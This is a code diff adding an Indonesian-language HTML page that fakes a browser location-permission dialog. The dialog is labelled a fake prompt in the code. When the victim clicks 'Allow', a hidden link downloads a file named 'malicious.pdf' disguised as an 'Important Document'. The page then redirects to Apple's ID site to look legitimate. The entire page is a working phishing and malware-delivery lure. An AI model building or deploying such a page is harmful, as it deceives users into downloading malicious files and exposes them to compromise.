@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Geo Prompt + Download Chain</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    .backdrop {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.2);
+      backdrop-filter: blur(5px);
+      z-index: 9998;
+    }
+
+    .geo-prompt {
+      position: fixed;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 300px;
+      background: #f9f9f9;
+      border-radius: 14px;
+      padding: 20px;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.3);
+      text-align: center;
+      z-index: 9999;
+      display: none;
+    }
+
+    .geo-prompt h3 {
+      font-size: 16px;
+      margin-bottom: 12px;
+      color: #333;
+    }
+
+    .geo-prompt .buttons {
+      margin-top: 15px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .geo-prompt button {
+      padding: 8px 14px;
+      font-size: 14px;
+      border: none;
+      border-radius: 8px;
+      flex: 1;
+      margin: 0 5px;
+      cursor: pointer;
+    }
+
+    .allow {
+      background-color: #007aff;
+      color: white;
+    }
+
+    .deny {
+      background-color: #e0e0e0;
+      color: #222;
+    }
+
+    #loading {
+      position: fixed;
+      top: 45%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 15px;
+      color: #444;
+      display: none;
+      z-index: 10000;
+    }
+
+    #triggerDownload {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Backdrop -->
+<div class="backdrop" id="bg" style="display:none;"></div>
+
+<!-- Prompt Palsu -->
+<div class="geo-prompt" id="prompt">
+  <h3>“example.com” ingin menggunakan lokasi Anda</h3>
+  <div class="buttons">
+    <button class="deny" onclick="hidePrompt()">Jangan Izinkan</button>
+    <button class="allow" onclick="allowAccess()">Izinkan</button>
+  </div>
+</div>
+
+<!-- Loading -->
+<div id="loading">Memproses permintaan lokasi...</div>
+
+<!-- Link download tersembunyi -->
+<a id="triggerDownload" href="malicious.pdf" download="DokumenPenting.pdf"></a>
+
+<script>
+  setTimeout(() => {
+    document.getElementById('bg').style.display = 'block';
+    document.getElementById('prompt').style.display = 'block';
+  }, 1500);
+
+  function hidePrompt() {
+    document.getElementById('bg').style.display = 'none';
+    document.getElementById('prompt').style.display = 'none';
+  }
+
+  function allowAccess() {
+    hidePrompt();
+    document.getElementById('loading').style.display = 'block';
+
+    // Trigger download secara otomatis
+    document.getElementById('triggerDownload').click();
+
+    // Setelah delay, redirect ke trusted domain
+    setTimeout(() => {
+      window.location.href = "https://appleid.apple.com";
+    }, 1500);
+  }
+</script>
+
+</body>
+</html>
